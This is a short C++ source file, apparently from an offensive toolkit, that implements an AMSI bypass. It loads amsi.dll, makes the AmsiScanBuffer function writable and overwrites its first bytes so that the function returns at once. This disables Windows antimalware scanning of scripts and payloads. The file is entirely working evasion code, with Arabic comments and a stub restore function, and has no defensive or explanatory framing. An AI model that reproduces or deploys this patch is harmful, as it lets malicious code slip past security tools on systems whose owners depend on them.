// amsi_bypass.cpp
#include "amsi_bypass.h"
#include <cstring>       // for memcpy
#include <memoryapi.h>   // for VirtualProtect

const BYTE patchBytes[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
const SIZE_T patchSize = sizeof(patchBytes);

bool BypassAMSI() {
    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
    if (!hAmsi) {
        hAmsi = LoadLibraryA("amsi.dll");
        if (!hAmsi) return false;
    }
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return false;
    
    LPVOID pTarget = (LPVOID)pAmsiScanBuffer;   // التحويل الصريح
    
    DWORD oldProtect = 0;
    if (!VirtualProtect(pTarget, patchSize, PAGE_EXECUTE_READWRITE, &oldProtect))
        return false;
    
    memcpy(pTarget, patchBytes, patchSize);
    VirtualProtect(pTarget, patchSize, oldProtect, &oldProtect);
    return true;
}

bool RestoreAMSI() {
    // في هذا الإصدار المبسط لا نحتاج للاستعادة
    return false;
}